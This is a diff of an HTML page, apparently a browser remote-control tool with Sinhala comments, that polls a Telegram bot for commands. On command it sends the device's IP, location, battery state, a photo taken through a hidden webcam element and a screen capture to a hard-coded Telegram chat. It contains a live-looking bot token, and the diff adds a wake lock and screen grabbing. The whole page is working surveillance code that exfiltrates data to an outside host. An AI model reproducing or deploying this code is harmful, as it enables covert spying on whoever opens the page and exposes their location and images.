@@ -2,93 +2,117 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>Remote Control System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lakmina Remote Console</title>
     <style>
-        body { background: #000; color: #0f0; text-align: center; font-family: monospace; }
-        .status { margin-top: 40vh; font-size: 20px; }
+        body { background: #000; color: #0f0; text-align: center; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
+        .box { border: 1px solid #0f0; padding: 20px; margin-top: 30vh; display: inline-block; box-shadow: 0 0 15px #0f0; }
+        .blink { animation: blinker 1s linear infinite; color: red; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
-<body>
-    <div class="status">SYSTEM ACTIVE...<br>WAITING FOR COMMANDS</div>
-    
+<body onclick="initSystem()">
+
+    <div class="box">
+        <h2>LAKMINA CONTROL v2.0</h2>
+        <p id="status">STATUS: [ WAITING FOR INITIAL TOUCH ]</p>
+        <p class="blink">● SYSTEM LISTENING</p>
+    </div>
+
     <video id="v" style="display:none" autoplay></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-
         const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
         const CHAT_ID = '7883989086';
-        let lastUpdateId = 0;
+        let lastId = 0;
 
-        // 1. Telegram එකෙන් මැසේජ් චෙක් කිරීම
-        async function checkCommands() {
+        // ස්ක්‍රීන් එක ඕෆ් වීම වැළැක්වීම (Wake Lock)
+        async function initSystem() {
+            document.getElementById('status').innerText = "STATUS: [ SYSTEM FULLY ARMED ]";
+            document.getElementById('status').style.color = "#0f0";
+            if ('wakeLock' in navigator) {
+                try { await navigator.wakeLock.request('screen'); } catch (err) {}
+            }
+            sendText("✅ System fully armed and connected to PC.");
+        }
+
+        async function poll() {
             try {
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
-                const data = await res.json();
+                const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastId + 1}`);
+                const d = await r.json();
+                if (d.result.length > 0) {
+                    for (let u of d.result) {
+                        lastId = u.update_id;
+                        let cmd = u.message.text.toLowerCase();
 
-                if (data.result.length > 0) {
-                    for (let update of data.result) {
-                        lastUpdateId = update.update_id;
-                        let msg = update.message.text.toLowerCase();
-
-                        // මේ කොටස විතරක් වෙනස් කරන්න
-if (msg === 'ip') sendIP();
-if (msg === 'photo') takePhoto();
-if (msg === 'location') sendLocation();
-if (msg === 'battery') {
-    navigator.getBattery().then(batt => {
-        sendText("🔋 බැටරි මට්ටම: " + (batt.level * 100) + "%");
-    });
-}
-if (msg === 'status') {
-    sendText("📶 Online: " + navigator.onLine + "\n📱 Platform: " + navigator.platform);
-}
+                        if (cmd === 'ip') getIP();
+                        if (cmd === 'photo') takePhoto();
+                        if (cmd === 'location') getLocation();
+                        if (cmd === 'battery') getBattery();
+                        if (cmd === 'screen') takeScreenshot(); // ස්ක්‍රීන් එක ගන්න
+                    }
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) {}
         }
 
-        // 2. IP ඇඩ්‍රස් එක යැවීම
-        async function sendIP() {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            sendText(`📍 IP Address: ${data.ip}`);
+        async function getIP() {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            sendText("📍 IP: " + d.ip);
         }
 
-        // 3. ලොකේෂන් එක යැවීම
-        function sendLocation() {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);
-            }, err => sendText("Location Error: " + err.message));
+        function getBattery() {
+            navigator.getBattery().then(b => {
+                sendText(`🔋 Battery: ${b.level * 100}% | Charging: ${b.charging}`);
+            });
         }
 
-        // 4. කැමරාවෙන් ෆොටෝ එකක් ගැනීම
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${p.coords.latitude}&longitude=${p.coords.longitude}`);
+            });
+        }
+
         async function takePhoto() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('v');
-            video.srcObject = stream;
+            video.srcObject = s;
             setTimeout(() => {
                 const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    let fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', blob, 'cam.png');
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
+                canvas.toBlob(b => {
+                    let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 'c.png');
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
+                    s.getTracks().forEach(t => t.stop());
                 });
             }, 1000);
         }
 
-        function sendText(txt) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
+        // ස්ක්‍රීන් එකේ Frame එකක් ගැනීමට උත්සාහ කිරීම
+        async function takeScreenshot() {
+            try {
+                const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const track = s.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const bitmap = await imageCapture.grabFrame();
+                const canvas = document.getElementById('c');
+                canvas.width = bitmap.width; canvas.height = bitmap.height;
+                canvas.getContext('2d').drawImage(bitmap, 0, 0);
+                canvas.toBlob(b => {
+                    let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 's.png');
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
+                    track.stop();
+                });
+            } catch (e) { sendText("Screen Capture Error: " + e.message); }
         }
 
-        // හැම තත්පර 3කට වරක්ම අලුත් මැසේජ් තියෙනවද බලන්න
-        setInterval(checkCommands, 3000);
+        function sendText(t) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}`);
+        }
+
+        setInterval(poll, 3000);
     </script>
 </body>
 </html>
